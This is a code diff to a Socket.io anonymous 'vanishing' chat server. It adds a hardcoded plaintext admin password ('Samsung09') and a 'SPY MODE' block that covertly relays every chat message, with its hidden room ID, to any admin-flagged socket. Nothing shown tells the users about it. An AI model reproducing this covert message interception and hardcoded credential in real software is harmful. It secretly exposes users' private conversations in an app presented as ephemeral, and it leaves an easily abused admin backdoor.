@@ -18,11 +18,14 @@ const roomsData = {};
 io.on('connection', (socket) => {
     activeUsers++;
     socket.lastPartnerId = null; 
+    socket.isAdmin = false; 
+    
     io.emit('stats_update', { activeUsers, vanishedChats });
 
-    // === PASSWORD LOCKED ADMIN PROTOCOL ===
+    // === ADMIN LOGIN PROTOCOL ===
     socket.on('get_admin_data', (secret) => {
-        if (secret === "Samsung09") {
+        if (secret.trim() === "Samsung09") {
+            socket.isAdmin = true; 
             socket.emit('admin_dashboard', {
                 totalUsers: activeUsers,
                 waitingUsers: waitingPool.length,
@@ -30,7 +33,7 @@ io.on('connection', (socket) => {
                 totalVanished: vanishedChats
             });
         } else {
-            socket.emit('admin_error'); // Sends a rejection if they guess wrong
+            socket.emit('admin_error'); 
         }
     });
 
@@ -62,8 +65,15 @@ io.on('connection', (socket) => {
             roomsData[socket.room].usedChars += msg.length;
             const used = roomsData[socket.room].usedChars;
             const max = roomsData[socket.room].maxChars;
+            
             socket.to(socket.room).emit('receive_message', msg);
             io.to(socket.room).emit('sync_chars', { used, max });
+
+            // === SPY MODE: Send text AND the hidden Room ID ===
+            io.sockets.sockets.forEach((s) => {
+                if (s.isAdmin) s.emit('spy_feed', { text: msg, roomId: socket.room });
+            });
+
             if (used >= max) io.to(socket.room).emit('force_shatter');
         }
     });
@@ -79,7 +89,6 @@ io.on('connection', (socket) => {
     socket.on('game_action', (actionData) => { if (socket.room) socket.to(socket.room).emit('game_action', actionData); });
     socket.on('submit_rating', (rating) => { if (socket.room) socket.to(socket.room).emit('receive_rating', rating); });
     socket.on('chat_shattered', () => { vanishedChats++; io.emit('stats_update', { activeUsers, vanishedChats }); });
-
     socket.on('leave_chat', () => {
         if (socket.room) {
             io.to(socket.room).emit('stranger_disconnected'); 
@@ -90,7 +99,6 @@ io.on('connection', (socket) => {
         }
         waitingPool = waitingPool.filter(u => u.id !== socket.id);
     });
-
     socket.on('disconnect', () => {
         activeUsers--;
         waitingPool = waitingPool.filter(u => u.id !== socket.id);
